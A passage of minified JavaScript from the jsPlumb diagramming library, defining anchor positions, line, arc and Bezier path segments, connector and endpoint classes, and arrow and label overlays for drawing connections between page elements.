    e(.5, 0, 0, -1, "TopCenter"), e(.5, 1, 0, 1, "BottomCenter"), e(0, .5, -1, 0, "LeftMiddle"), e(1, .5, 1, 0, "RightMiddle"), e(.5, 0, 0, -1, "Top"), e(.5, 1, 0, 1, "Bottom"), e(0, .5, -1, 0, "Left"), e(1, .5, 1, 0, "Right"), e(.5, .5, 0, 0, "Center"), e(1, 0, 0, -1, "TopRight"), e(1, 1, 0, 1, "BottomRight"), e(0, 0, 0, -1, "TopLeft"), e(0, 1, 0, 1, "BottomLeft"), c.Defaults.DynamicAnchors = function (a) {
        return a.jsPlumbInstance.makeAnchors(["TopCenter", "RightMiddle", "BottomCenter", "LeftMiddle"], a.elementId, a.jsPlumbInstance)
    }, c.Anchors.AutoDefault = function (a) {
        var b = a.jsPlumbInstance.makeDynamicAnchor(c.Defaults.DynamicAnchors(a));
        return b.type = "AutoDefault", b
    };
    var f = function (a, b) {
        c.Anchors[a] = function (c) {
            var d = c.jsPlumbInstance.makeAnchor(["Continuous", {faces: b}], c.elementId, c.jsPlumbInstance);
            return d.type = a, d
        }
    };
    c.Anchors.Continuous = function (a) {
        return a.jsPlumbInstance.continuousAnchorFactory.get(a)
    }, f("ContinuousLeft", ["left"]), f("ContinuousTop", ["top"]), f("ContinuousBottom", ["bottom"]), f("ContinuousRight", ["right"]), e(0, 0, 0, 0, "Assign", function (a, b) {
        var c = b.position || "Fixed";
        a.positionFinder = c.constructor === String ? b.jsPlumbInstance.AnchorPositionFinders[c] : c, a.constructorParams = b
    }), a.jsPlumbInstance.prototype.AnchorPositionFinders = {
        Fixed: function (a, b, c) {
            return [(a.left - b.left) / c[0], (a.top - b.top) / c[1]]
        }, Grid: function (a, b, c, d) {
            var e = a.left - b.left, f = a.top - b.top, g = c[0] / d.grid[0], h = c[1] / d.grid[1],
                i = Math.floor(e / g), j = Math.floor(f / h);
            return [(i * g + g / 2) / c[0], (j * h + h / 2) / c[1]]
        }
    }, c.Anchors.Perimeter = function (a) {
        a = a || {};
        var b = a.anchorCount || 60, c = a.shape;
        if (!c) throw new Error("no shape supplied to Perimeter Anchor type");
        var d = function () {
            for (var a = .5, c = 2 * Math.PI / b, d = 0, e = [], f = 0; f < b; f++) {
                var g = a + a * Math.sin(d), h = a + a * Math.cos(d);
                e.push([g, h, 0, 0]), d += c
            }
            return e
        }, e = function (a) {
            for (var c = b / a.length, d = [], e = function (a, e, f, g, h) {
                c = b * h;
                for (var i = (f - a) / c, j = (g - e) / c, k = 0; k < c; k++) d.push([a + i * k, e + j * k, 0, 0])
            }, f = 0; f < a.length; f++) e.apply(null, a[f]);
            return d
        }, f = function (a) {
            for (var b = [], c = 0; c < a.length; c++) b.push([a[c][0], a[c][1], a[c][2], a[c][3], 1 / a.length]);
            return e(b)
        }, g = function () {
            return f([[0, 0, 1, 0], [1, 0, 1, 1], [1, 1, 0, 1], [0, 1, 0, 0]])
        }, h = {
            Circle: d, Ellipse: d, Diamond: function () {
                return f([[.5, 0, 1, .5], [1, .5, .5, 1], [.5, 1, 0, .5], [0, .5, .5, 0]])
            }, Rectangle: g, Square: g, Triangle: function () {
                return f([[.5, 0, 1, 1], [1, 1, 0, 1], [0, 1, .5, 0]])
            }, Path: function (a) {
                for (var b = a.points, c = [], d = 0, f = 0; f < b.length - 1; f++) {
                    var g = Math.sqrt(Math.pow(b[f][2] - b[f][0]) + Math.pow(b[f][3] - b[f][1]));
                    d += g, c.push([b[f][0], b[f][1], b[f + 1][0], b[f + 1][1], g])
                }
                for (var h = 0; h < c.length; h++) c[h][4] = c[h][4] / d;
                return e(c)
            }
        }, i = function (a, b) {
            for (var c = [], d = b / 180 * Math.PI, e = 0; e < a.length; e++) {
                var f = a[e][0] - .5, g = a[e][1] - .5;
                c.push([f * Math.cos(d) - g * Math.sin(d) + .5, f * Math.sin(d) + g * Math.cos(d) + .5, a[e][2], a[e][3]])
            }
            return c
        };
        if (!h[c]) throw new Error("Shape [" + c + "] is unknown by Perimeter Anchor type");
        var j = h[c](a);
        a.rotation && (j = i(j, a.rotation));
        var k = a.jsPlumbInstance.makeDynamicAnchor(j);
        return k.type = "Perimeter", k
    }
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = a.Biltong;
    b.Segments = {
        AbstractSegment: function (a) {
            this.params = a, this.findClosestPointOnPath = function (a, b) {
                return {d: 1 / 0, x: null, y: null, l: null}
            }, this.getBounds = function () {
                return {
                    minX: Math.min(a.x1, a.x2),
                    minY: Math.min(a.y1, a.y2),
                    maxX: Math.max(a.x1, a.x2),
                    maxY: Math.max(a.y1, a.y2)
                }
            }
        }, Straight: function (a) {
            var c, e, f, g, h, i, j, k = (b.Segments.AbstractSegment.apply(this, arguments), function () {
                c = Math.sqrt(Math.pow(h - g, 2) + Math.pow(j - i, 2)), e = d.gradient({x: g, y: i}, {
                    x: h,
                    y: j
                }), f = -1 / e
            });
            this.type = "Straight", this.getLength = function () {
                return c
            }, this.getGradient = function () {
                return e
            }, this.getCoordinates = function () {
                return {x1: g, y1: i, x2: h, y2: j}
            }, this.setCoordinates = function (a) {
                g = a.x1, i = a.y1, h = a.x2, j = a.y2, k()
            }, this.setCoordinates({x1: a.x1, y1: a.y1, x2: a.x2, y2: a.y2}), this.getBounds = function () {
                return {minX: Math.min(g, h), minY: Math.min(i, j), maxX: Math.max(g, h), maxY: Math.max(i, j)}
            }, this.pointOnPath = function (a, b) {
                if (0 !== a || b) {
                    if (1 !== a || b) {
                        var e = b ? a > 0 ? a : c + a : a * c;
                        return d.pointOnLine({x: g, y: i}, {x: h, y: j}, e)
                    }
                    return {x: h, y: j}
                }
                return {x: g, y: i}
            }, this.gradientAtPoint = function (a) {
                return e
            }, this.pointAlongPathFrom = function (a, b, c) {
                var e = this.pointOnPath(a, c), f = b <= 0 ? {x: g, y: i} : {x: h, y: j};
                return b <= 0 && Math.abs(b) > 1 && (b *= -1), d.pointOnLine(e, f, b)
            };
            var l = function (a, b, c) {
                return c >= Math.min(a, b) && c <= Math.max(a, b)
            }, m = function (a, b, c) {
                return Math.abs(c - a) < Math.abs(c - b) ? a : b
            };
            this.findClosestPointOnPath = function (a, b) {
                var k = {d: 1 / 0, x: null, y: null, l: null, x1: g, x2: h, y1: i, y2: j};
                if (0 === e) k.y = i, k.x = l(g, h, a) ? a : m(g, h, a); else if (e === 1 / 0 || e === -1 / 0) k.x = g, k.y = l(i, j, b) ? b : m(i, j, b); else {
                    var n = i - e * g, o = b - f * a, p = (o - n) / (e - f), q = e * p + n;
                    k.x = l(g, h, p) ? p : m(g, h, p), k.y = l(i, j, q) ? q : m(i, j, q)
                }
                var r = d.lineLength([k.x, k.y], [g, i]);
                return k.d = d.lineLength([a, b], [k.x, k.y]), k.l = r / c, k
            }
        }, Arc: function (a) {
            var c = (b.Segments.AbstractSegment.apply(this, arguments), function (b, c) {
                return d.theta([a.cx, a.cy], [b, c])
            }), e = function (a, b) {
                if (a.anticlockwise) {
                    var c = a.startAngle < a.endAngle ? a.startAngle + f : a.startAngle;
                    return c - Math.abs(c - a.endAngle) * b
                }
                var d = a.endAngle < a.startAngle ? a.endAngle + f : a.endAngle, e = Math.abs(d - a.startAngle);
                return a.startAngle + e * b
            }, f = 2 * Math.PI;
            this.radius = a.r, this.anticlockwise = a.ac, this.type = "Arc", a.startAngle && a.endAngle ? (this.startAngle = a.startAngle, this.endAngle = a.endAngle, this.x1 = a.cx + this.radius * Math.cos(a.startAngle), this.y1 = a.cy + this.radius * Math.sin(a.startAngle), this.x2 = a.cx + this.radius * Math.cos(a.endAngle), this.y2 = a.cy + this.radius * Math.sin(a.endAngle)) : (this.startAngle = c(a.x1, a.y1), this.endAngle = c(a.x2, a.y2), this.x1 = a.x1, this.y1 = a.y1, this.x2 = a.x2, this.y2 = a.y2), this.endAngle < 0 && (this.endAngle += f), this.startAngle < 0 && (this.startAngle += f);
            var g = this.endAngle < this.startAngle ? this.endAngle + f : this.endAngle;
            this.sweep = Math.abs(g - this.startAngle), this.anticlockwise && (this.sweep = f - this.sweep);
            var h = 2 * Math.PI * this.radius, i = this.sweep / f, j = h * i;
            this.getLength = function () {
                return j
            }, this.getBounds = function () {
                return {minX: a.cx - a.r, maxX: a.cx + a.r, minY: a.cy - a.r, maxY: a.cy + a.r}
            };
            var k = 1e-10, l = function (a) {
                var b = Math.floor(a), c = Math.ceil(a);
                return a - b < k ? b : c - a < k ? c : a
            };
            this.pointOnPath = function (b, c) {
                if (0 === b) return {x: this.x1, y: this.y1, theta: this.startAngle};
                if (1 === b) return {x: this.x2, y: this.y2, theta: this.endAngle};
                c && (b /= j);
                var d = e(this, b), f = a.cx + a.r * Math.cos(d), g = a.cy + a.r * Math.sin(d);
                return {x: l(f), y: l(g), theta: d}
            }, this.gradientAtPoint = function (b, c) {
                var e = this.pointOnPath(b, c), f = d.normal([a.cx, a.cy], [e.x, e.y]);
                return this.anticlockwise || f !== 1 / 0 && f !== -1 / 0 || (f *= -1), f
            }, this.pointAlongPathFrom = function (b, c, d) {
                var e = this.pointOnPath(b, d), f = c / h * 2 * Math.PI, g = this.anticlockwise ? -1 : 1,
                    i = e.theta + g * f;
                return {x: a.cx + this.radius * Math.cos(i), y: a.cy + this.radius * Math.sin(i)}
            }
        }, Bezier: function (c) {
            this.curve = [{x: c.x1, y: c.y1}, {x: c.cp1x, y: c.cp1y}, {x: c.cp2x, y: c.cp2y}, {x: c.x2, y: c.y2}];
            b.Segments.AbstractSegment.apply(this, arguments);
            this.bounds = {
                minX: Math.min(c.x1, c.x2, c.cp1x, c.cp2x),
                minY: Math.min(c.y1, c.y2, c.cp1y, c.cp2y),
                maxX: Math.max(c.x1, c.x2, c.cp1x, c.cp2x),
                maxY: Math.max(c.y1, c.y2, c.cp1y, c.cp2y)
            }, this.type = "Bezier";
            var d = function (b, c, d) {
                return d && (c = a.jsBezier.locationAlongCurveFrom(b, c > 0 ? 0 : 1, c)), c
            };
            this.pointOnPath = function (b, c) {
                return b = d(this.curve, b, c), a.jsBezier.pointOnCurve(this.curve, b)
            }, this.gradientAtPoint = function (b, c) {
                return b = d(this.curve, b, c), a.jsBezier.gradientAtPoint(this.curve, b)
            }, this.pointAlongPathFrom = function (b, c, e) {
                return b = d(this.curve, b, e), a.jsBezier.pointAlongCurveFrom(this.curve, b, c)
            }, this.getLength = function () {
                return a.jsBezier.getLength(this.curve)
            }, this.getBounds = function () {
                return this.bounds
            }
        }
    }, b.SegmentRenderer = {
        getPath: function (a) {
            return {
                Straight: function () {
                    var b = a.getCoordinates();
                    return "M " + b.x1 + " " + b.y1 + " L " + b.x2 + " " + b.y2
                }, Bezier: function () {
                    var b = a.params;
                    return "M " + b.x1 + " " + b.y1 + " C " + b.cp1x + " " + b.cp1y + " " + b.cp2x + " " + b.cp2y + " " + b.x2 + " " + b.y2
                }, Arc: function () {
                    var b = a.params, c = a.sweep > Math.PI ? 1 : 0, d = a.anticlockwise ? 0 : 1;
                    return "M" + a.x1 + " " + a.y1 + " A " + a.radius + " " + b.r + " 0 " + c + "," + d + " " + a.x2 + " " + a.y2
                }
            }[a.type]()
        }
    };
    var e = function () {
        this.resetBounds = function () {
            this.bounds = {minX: 1 / 0, minY: 1 / 0, maxX: -1 / 0, maxY: -1 / 0}
        }, this.resetBounds()
    };
    b.Connectors.AbstractConnector = function (a) {
        e.apply(this, arguments);
        var f = [], g = 0, h = [], i = [], j = a.stub || 0, k = c.isArray(j) ? j[0] : j, l = c.isArray(j) ? j[1] : j,
            m = a.gap || 0, n = c.isArray(m) ? m[0] : m, o = c.isArray(m) ? m[1] : m, p = null, q = null;
        this.getPathData = function () {
            for (var a = "", c = 0; c < f.length; c++) a += b.SegmentRenderer.getPath(f[c]), a += " ";
            return a
        }, this.findSegmentForPoint = function (a, b) {
            for (var c = {d: 1 / 0, s: null, x: null, y: null, l: null}, d = 0; d < f.length; d++) {
                var e = f[d].findClosestPointOnPath(a, b);
                e.d < c.d && (c.d = e.d, c.l = e.l, c.x = e.x, c.y = e.y, c.s = f[d], c.x1 = e.x1, c.x2 = e.x2, c.y1 = e.y1, c.y2 = e.y2, c.index = d)
            }
            return c
        };
        var r = function () {
            for (var a = 0, b = 0; b < f.length; b++) {
                var c = f[b].getLength();
                i[b] = c / g, h[b] = [a, a += c / g]
            }
        }, s = function (a, b) {
            b && (a = a > 0 ? a / g : (g + a) / g);
            for (var c = h.length - 1, d = 1, e = 0; e < h.length; e++) if (h[e][1] >= a) {
                c = e, d = 1 === a ? 1 : 0 === a ? 0 : (a - h[e][0]) / i[e];
                break
            }
            return {segment: f[c], proportion: d, index: c}
        }, t = function (a, c, d) {
            if (d.x1 !== d.x2 || d.y1 !== d.y2) {
                var e = new b.Segments[c](d);
                f.push(e), g += e.getLength(), a.updateBounds(e)
            }
        }, u = function () {
            g = f.length = h.length = i.length = 0
        };
        this.setSegments = function (a) {
            p = [], g = 0;
            for (var b = 0; b < a.length; b++) p.push(a[b]), g += a[b].getLength()
        }, this.getLength = function () {
            return g
        };
        var v = function (a) {
            this.strokeWidth = a.strokeWidth;
            var b = d.quadrant(a.sourcePos, a.targetPos), c = a.targetPos[0] < a.sourcePos[0],
                e = a.targetPos[1] < a.sourcePos[1], f = a.strokeWidth || 1,
                g = a.sourceEndpoint.anchor.getOrientation(a.sourceEndpoint),
                h = a.targetEndpoint.anchor.getOrientation(a.targetEndpoint), i = c ? a.targetPos[0] : a.sourcePos[0],
                j = e ? a.targetPos[1] : a.sourcePos[1], m = Math.abs(a.targetPos[0] - a.sourcePos[0]),
                p = Math.abs(a.targetPos[1] - a.sourcePos[1]);
            if (0 === g[0] && 0 === g[1] || 0 === h[0] && 0 === h[1]) {
                var q = m > p ? 0 : 1, r = [1, 0][q];
                g = [], h = [], g[q] = a.sourcePos[q] > a.targetPos[q] ? -1 : 1, h[q] = a.sourcePos[q] > a.targetPos[q] ? 1 : -1, g[r] = 0, h[r] = 0
            }
            var s = c ? m + n * g[0] : n * g[0], t = e ? p + n * g[1] : n * g[1], u = c ? o * h[0] : m + o * h[0],
                v = e ? o * h[1] : p + o * h[1], w = g[0] * h[0] + g[1] * h[1], x = {
                    sx: s,
                    sy: t,
                    tx: u,
                    ty: v,
                    lw: f,
                    xSpan: Math.abs(u - s),
                    ySpan: Math.abs(v - t),
                    mx: (s + u) / 2,
                    my: (t + v) / 2,
                    so: g,
                    to: h,
                    x: i,
                    y: j,
                    w: m,
                    h: p,
                    segment: b,
                    startStubX: s + g[0] * k,
                    startStubY: t + g[1] * k,
                    endStubX: u + h[0] * l,
                    endStubY: v + h[1] * l,
                    isXGreaterThanStubTimes2: Math.abs(s - u) > k + l,
                    isYGreaterThanStubTimes2: Math.abs(t - v) > k + l,
                    opposite: -1 === w,
                    perpendicular: 0 === w,
                    orthogonal: 1 === w,
                    sourceAxis: 0 === g[0] ? "y" : "x",
                    points: [i, j, m, p, s, t, u, v],
                    stubs: [k, l]
                };
            return x.anchorOrientation = x.opposite ? "opposite" : x.orthogonal ? "orthogonal" : "perpendicular", x
        };
        this.getSegments = function () {
            return f
        }, this.updateBounds = function (a) {
            var b = a.getBounds();
            this.bounds.minX = Math.min(this.bounds.minX, b.minX), this.bounds.maxX = Math.max(this.bounds.maxX, b.maxX), this.bounds.minY = Math.min(this.bounds.minY, b.minY), this.bounds.maxY = Math.max(this.bounds.maxY, b.maxY)
        };
        return this.pointOnPath = function (a, b) {
            var c = s(a, b);
            return c.segment && c.segment.pointOnPath(c.proportion, !1) || [0, 0]
        }, this.gradientAtPoint = function (a, b) {
            var c = s(a, b);
            return c.segment && c.segment.gradientAtPoint(c.proportion, !1) || 0
        }, this.pointAlongPathFrom = function (a, b, c) {
            var d = s(a, c);
            return d.segment && d.segment.pointAlongPathFrom(d.proportion, b, !1) || [0, 0]
        }, this.compute = function (a) {
            q = v.call(this, a), u(), this._compute(q, a), this.x = q.points[0], this.y = q.points[1], this.w = q.points[2], this.h = q.points[3], this.segment = q.segment, r()
        }, {
            addSegment: t,
            prepareCompute: v,
            sourceStub: k,
            targetStub: l,
            maxStub: Math.max(k, l),
            sourceGap: n,
            targetGap: o,
            maxGap: Math.max(n, o)
        }
    }, c.extend(b.Connectors.AbstractConnector, e), b.Endpoints.AbstractEndpoint = function (a) {
        return e.apply(this, arguments), {
            compute: this.compute = function (a, b, c, d) {
                var e = this._compute.apply(this, arguments);
                return this.x = e[0], this.y = e[1], this.w = e[2], this.h = e[3], this.bounds.minX = this.x, this.bounds.minY = this.y, this.bounds.maxX = this.x + this.w, this.bounds.maxY = this.y + this.h, e
            }, cssClass: a.cssClass
        }
    }, c.extend(b.Endpoints.AbstractEndpoint, e), b.Endpoints.Dot = function (a) {
        this.type = "Dot";
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        a = a || {}, this.radius = a.radius || 10, this.defaultOffset = .5 * this.radius, this.defaultInnerRadius = this.radius / 3, this._compute = function (a, b, c, d) {
            this.radius = c.radius || this.radius;
            var e = a[0] - this.radius, f = a[1] - this.radius, g = 2 * this.radius, h = 2 * this.radius;
            if (c.stroke) {
                var i = c.strokeWidth || 1;
                e -= i, f -= i, g += 2 * i, h += 2 * i
            }
            return [e, f, g, h, this.radius]
        }
    }, c.extend(b.Endpoints.Dot, b.Endpoints.AbstractEndpoint), b.Endpoints.Rectangle = function (a) {
        this.type = "Rectangle";
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        a = a || {}, this.width = a.width || 20, this.height = a.height || 20, this._compute = function (a, b, c, d) {
            var e = c.width || this.width, f = c.height || this.height;
            return [a[0] - e / 2, a[1] - f / 2, e, f]
        }
    }, c.extend(b.Endpoints.Rectangle, b.Endpoints.AbstractEndpoint);
    var f = function (a) {
        b.jsPlumbUIComponent.apply(this, arguments), this._jsPlumb.displayElements = []
    };
    c.extend(f, b.jsPlumbUIComponent, {
        getDisplayElements: function () {
            return this._jsPlumb.displayElements
        }, appendDisplayElement: function (a) {
            this._jsPlumb.displayElements.push(a)
        }
    }), b.Endpoints.Image = function (d) {
        this.type = "Image", f.apply(this, arguments), b.Endpoints.AbstractEndpoint.apply(this, arguments);
        var e = d.onload, g = d.src || d.url, h = d.cssClass ? " " + d.cssClass : "";
        this._jsPlumb.img = new Image, this._jsPlumb.ready = !1, this._jsPlumb.initialized = !1, this._jsPlumb.deleted = !1, this._jsPlumb.widthToUse = d.width, this._jsPlumb.heightToUse = d.height, this._jsPlumb.endpoint = d.endpoint, this._jsPlumb.img.onload = function () {
            null != this._jsPlumb && (this._jsPlumb.ready = !0, this._jsPlumb.widthToUse = this._jsPlumb.widthToUse || this._jsPlumb.img.width, this._jsPlumb.heightToUse = this._jsPlumb.heightToUse || this._jsPlumb.img.height, e && e(this))
        }.bind(this), this._jsPlumb.endpoint.setImage = function (a, b) {
            var c = a.constructor === String ? a : a.src;
            e = b, this._jsPlumb.img.src = c, null != this.canvas && this.canvas.setAttribute("src", this._jsPlumb.img.src)
        }.bind(this), this._jsPlumb.endpoint.setImage(g, e), this._compute = function (a, b, c, d) {
            return this.anchorPoint = a, this._jsPlumb.ready ? [a[0] - this._jsPlumb.widthToUse / 2, a[1] - this._jsPlumb.heightToUse / 2, this._jsPlumb.widthToUse, this._jsPlumb.heightToUse] : [0, 0, 0, 0]
        }, this.canvas = b.createElement("img", {
            position: "absolute",
            margin: 0,
            padding: 0,
            outline: 0
        }, this._jsPlumb.instance.endpointClass + h), this._jsPlumb.widthToUse && this.canvas.setAttribute("width", this._jsPlumb.widthToUse), this._jsPlumb.heightToUse && this.canvas.setAttribute("height", this._jsPlumb.heightToUse), this._jsPlumb.instance.appendElement(this.canvas), this.actuallyPaint = function (a, b, d) {
            if (!this._jsPlumb.deleted) {
                this._jsPlumb.initialized || (this.canvas.setAttribute("src", this._jsPlumb.img.src), this.appendDisplayElement(this.canvas), this._jsPlumb.initialized = !0);
                var e = this.anchorPoint[0] - this._jsPlumb.widthToUse / 2,
                    f = this.anchorPoint[1] - this._jsPlumb.heightToUse / 2;
                c.sizeElement(this.canvas, e, f, this._jsPlumb.widthToUse, this._jsPlumb.heightToUse)
            }
        }, this.paint = function (b, c) {
            null != this._jsPlumb && (this._jsPlumb.ready ? this.actuallyPaint(b, c) : a.setTimeout(function () {
                this.paint(b, c)
            }.bind(this), 200))
        }
    }, c.extend(b.Endpoints.Image, [f, b.Endpoints.AbstractEndpoint], {
        cleanup: function (a) {
            a && (this._jsPlumb.deleted = !0, this.canvas && this.canvas.parentNode.removeChild(this.canvas), this.canvas = null)
        }
    }), b.Endpoints.Blank = function (a) {
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        this.type = "Blank", f.apply(this, arguments), this._compute = function (a, b, c, d) {
            return [a[0], a[1], 10, 0]
        };
        var d = a.cssClass ? " " + a.cssClass : "";
        this.canvas = b.createElement("div", {
            display: "block",
            width: "1px",
            height: "1px",
            background: "transparent",
            position: "absolute"
        }, this._jsPlumb.instance.endpointClass + d), this._jsPlumb.instance.appendElement(this.canvas), this.paint = function (a, b) {
            c.sizeElement(this.canvas, this.x, this.y, this.w, this.h)
        }
    }, c.extend(b.Endpoints.Blank, [b.Endpoints.AbstractEndpoint, f], {
        cleanup: function () {
            this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas)
        }
    }), b.Endpoints.Triangle = function (a) {
        this.type = "Triangle", b.Endpoints.AbstractEndpoint.apply(this, arguments);
        var c = this;
        a = a || {}, a.width = a.width || 55, a.height = a.height || 55, this.width = a.width, this.height = a.height, this._compute = function (a, b, d, e) {
            var f = d.width || c.width, g = d.height || c.height;
            return [a[0] - f / 2, a[1] - g / 2, f, g]
        }
    };
    var g = b.Overlays.AbstractOverlay = function (a) {
        this.visible = !0, this.isAppendedAtTopLevel = !0, this.component = a.component, this.loc = null == a.location ? .5 : a.location, this.endpointLoc = null == a.endpointLocation ? [.5, .5] : a.endpointLocation, this.visible = !1 !== a.visible
    };
    g.prototype = {
        cleanup: function (a) {
            a && (this.component = null, this.canvas = null, this.endpointLoc = null)
        }, reattach: function (a, b) {
        }, setVisible: function (a) {
            this.visible = a, this.component.repaint()
        }, isVisible: function () {
            return this.visible
        }, hide: function () {
            this.setVisible(!1)
        }, show: function () {
            this.setVisible(!0)
        }, incrementLocation: function (a) {
            this.loc += a, this.component.repaint()
        }, setLocation: function (a) {
            this.loc = a, this.component.repaint()
        }, getLocation: function () {
            return this.loc
        }, updateFrom: function () {
        }
    }, b.Overlays.Arrow = function (a) {
        this.type = "Arrow", g.apply(this, arguments), this.isAppendedAtTopLevel = !1, a = a || {};
        var e = this;
        this.length = a.length || 20, this.width = a.width || 20, this.id = a.id;
        var f = (a.direction || 1) < 0 ? -1 : 1, h = a.paintStyle || {"stroke-width": 1}, i = a.foldback || .623;
        this.computeMaxSize = function () {
            return 1.5 * e.width
        }, this.elementCreated = function (c, d) {
            if (this.path = c, a.events) for (var e in a.events) b.on(c, e, a.events[e])
        }, this.draw = function (a, b) {
            var e, g, j, k, l;
            if (a.pointAlongPathFrom) {
                if (c.isString(this.loc) || this.loc > 1 || this.loc < 0) {
                    var m = parseInt(this.loc, 10), n = this.loc < 0 ? 1 : 0;
                    e = a.pointAlongPathFrom(n, m, !1), g = a.pointAlongPathFrom(n, m - f * this.length / 2, !1), j = d.pointOnLine(e, g, this.length)
                } else if (1 === this.loc) {
                    if (e = a.pointOnPath(this.loc), g = a.pointAlongPathFrom(this.loc, -this.length), j = d.pointOnLine(e, g, this.length), -1 === f) {
                        var o = j;
                        j = e, e = o
                    }
                } else if (0 === this.loc) {
                    if (j = a.pointOnPath(this.loc), g = a.pointAlongPathFrom(this.loc, this.length), e = d.pointOnLine(j, g, this.length), -1 === f) {
                        var p = j;
                        j = e, e = p
                    }
                } else e = a.pointAlongPathFrom(this.loc, f * this.length / 2), g = a.pointOnPath(this.loc), j = d.pointOnLine(e, g, this.length);
                k = d.perpendicularLineTo(e, j, this.width), l = d.pointOnLine(e, j, i * this.length);
                var q = {hxy: e, tail: k, cxy: l}, r = h.stroke || b.stroke, s = h.fill || b.stroke;
                return {
                    component: a,
                    d: q,
                    "stroke-width": h.strokeWidth || b.strokeWidth,
                    stroke: r,
                    fill: s,
                    minX: Math.min(e.x, k[0].x, k[1].x),
                    maxX: Math.max(e.x, k[0].x, k[1].x),
                    minY: Math.min(e.y, k[0].y, k[1].y),
                    maxY: Math.max(e.y, k[0].y, k[1].y)
                }
            }
            return {component: a, minX: 0, maxX: 0, minY: 0, maxY: 0}
        }
    }, c.extend(b.Overlays.Arrow, g, {
        updateFrom: function (a) {
            this.length = a.length || this.length, this.width = a.width || this.width, this.direction = null != a.direction ? a.direction : this.direction, this.foldback = a.foldback || this.foldback
        }
    }), b.Overlays.PlainArrow = function (a) {
        a = a || {};
        var c = b.extend(a, {foldback: 1});
        b.Overlays.Arrow.call(this, c), this.type = "PlainArrow"
    }, c.extend(b.Overlays.PlainArrow, b.Overlays.Arrow), b.Overlays.Diamond = function (a) {
        a = a || {};
        var c = a.length || 40, d = b.extend(a, {length: c / 2, foldback: 2});
        b.Overlays.Arrow.call(this, d), this.type = "Diamond"
    }, c.extend(b.Overlays.Diamond, b.Overlays.Arrow);
    var h = function (a, b) {
        return (null == a._jsPlumb.cachedDimensions || b) && (a._jsPlumb.cachedDimensions = a.getDimensions()), a._jsPlumb.cachedDimensions
    }, i = function (a) {
        b.jsPlumbUIComponent.apply(this, arguments), g.apply(this, arguments);
        var d = this.fire;
        this.fire = function () {
            d.apply(this, arguments), this.component && this.component.fire.apply(this.component, arguments)
        }, this.detached = !1, this.id = a.id, this._jsPlumb.div = null, this._jsPlumb.initialised = !1, this._jsPlumb.component = a.component, this._jsPlumb.cachedDimensions = null, this._jsPlumb.create = a.create, this._jsPlumb.initiallyInvisible = !1 === a.visible, this.getElement = function () {
            if (null == this._jsPlumb.div) {
                var c = this._jsPlumb.div = b.getElement(this._jsPlumb.create(this._jsPlumb.component));
                c.style.position = "absolute", c.className = this._jsPlumb.instance.overlayClass + " " + (this.cssClass ? this.cssClass : a.cssClass ? a.cssClass : ""), this._jsPlumb.instance.appendElement(c), this._jsPlumb.instance.getId(c), this.canvas = c;
                var d = "translate(-50%, -50%)";
                c.style.webkitTransform = d, c.style.mozTransform = d, c.style.msTransform = d, c.style.oTransform = d, c.style.transform = d, c._jsPlumb = this, !1 === a.visible && (c.style.display = "none")
            }
            return this._jsPlumb.div
        }, this.draw = function (a, b, d) {
            var e = h(this);
            if (null != e && 2 === e.length) {
                var f = {x: 0, y: 0};
                if (d) f = {x: d[0], y: d[1]}; else if (a.pointOnPath) {
                    var g = this.loc, i = !1;
                    (c.isString(this.loc) || this.loc < 0 || this.loc > 1) && (g = parseInt(this.loc, 10), i = !0), f = a.pointOnPath(g, i)
                } else {
                    var j = this.loc.constructor === Array ? this.loc : this.endpointLoc;
                    f = {x: j[0] * a.w, y: j[1] * a.h}
                }
                var k = f.x - e[0] / 2, l = f.y - e[1] / 2;
                return {
                    component: a,
                    d: {minx: k, miny: l, td: e, cxy: f},
                    minX: k,
                    maxX: k + e[0],
                    minY: l,
                    maxY: l + e[1]
                }
            }
            return {minX: 0, maxX: 0, minY: 0, maxY: 0}
        }
    };
    c.extend(i, [b.jsPlumbUIComponent, g], {
        getDimensions: function () {
            return [1, 1]
        }, setVisible: function (a) {
            this._jsPlumb.div && (this._jsPlumb.div.style.display = a ? "block" : "none", a && this._jsPlumb.initiallyInvisible && (h(this, !0), this.component.repaint(), this._jsPlumb.initiallyInvisible = !1))
        }, clearCachedDimensions: function () {
            this._jsPlumb.cachedDimensions = null
        }, cleanup: function (a) {
            a ? null != this._jsPlumb.div && (this._jsPlumb.div._jsPlumb = null, this._jsPlumb.instance.removeElement(this._jsPlumb.div)) : (this._jsPlumb && this._jsPlumb.div && this._jsPlumb.div.parentNode && this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div), this.detached = !0)
        }, reattach: function (a, b) {
            null != this._jsPlumb.div && a.getContainer().appendChild(this._jsPlumb.div), this.detached = !1
        }, computeMaxSize: function () {
            var a = h(this);
            return Math.max(a[0], a[1])
        }, paint: function (a, b) {
            this._jsPlumb.initialised || (this.getElement(), a.component.appendDisplayElement(this._jsPlumb.div), this._jsPlumb.initialised = !0, this.detached && this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div)), this._jsPlumb.div.style.left = a.component.x + a.d.minx + "px", this._jsPlumb.div.style.top = a.component.y + a.d.miny + "px"
        }
    }), b.Overlays.Custom = function (a) {
        this.type = "Custom", i.apply(this, arguments)
    }, c.extend(b.Overlays.Custom, i), b.Overlays.GuideLines = function () {
        var a = this;
        a.length = 50, a.strokeWidth = 5, this.type = "GuideLines", g.apply(this, arguments), b.jsPlumbUIComponent.apply(this, arguments), this.draw = function (b, c) {
            var e = b.pointAlongPathFrom(a.loc, a.length / 2), f = b.pointOnPath(a.loc),
                g = d.pointOnLine(e, f, a.length), h = d.perpendicularLineTo(e, g, 40),
                i = d.perpendicularLineTo(g, e, 20);
            return {
                connector: b,
                head: e,
                tail: g,
                headLine: i,
                tailLine: h,
                minX: Math.min(e.x, g.x, i[0].x, i[1].x),
                minY: Math.min(e.y, g.y, i[0].y, i[1].y),
                maxX: Math.max(e.x, g.x, i[0].x, i[1].x),
                maxY: Math.max(e.y, g.y, i[0].y, i[1].y)
            }
        }
    }, b.Overlays.Label = function (a) {
        this.labelStyle = a.labelStyle;
        this.cssClass = null != this.labelStyle ? this.labelStyle.cssClass : null;
        var c = b.extend({
            create: function () {
                return b.createElement("div")
            }
        }, a);
        if (b.Overlays.Custom.call(this, c), this.type = "Label", this.label = a.label || "", this.labelText = null, this.labelStyle) {
            var d = this.getElement();
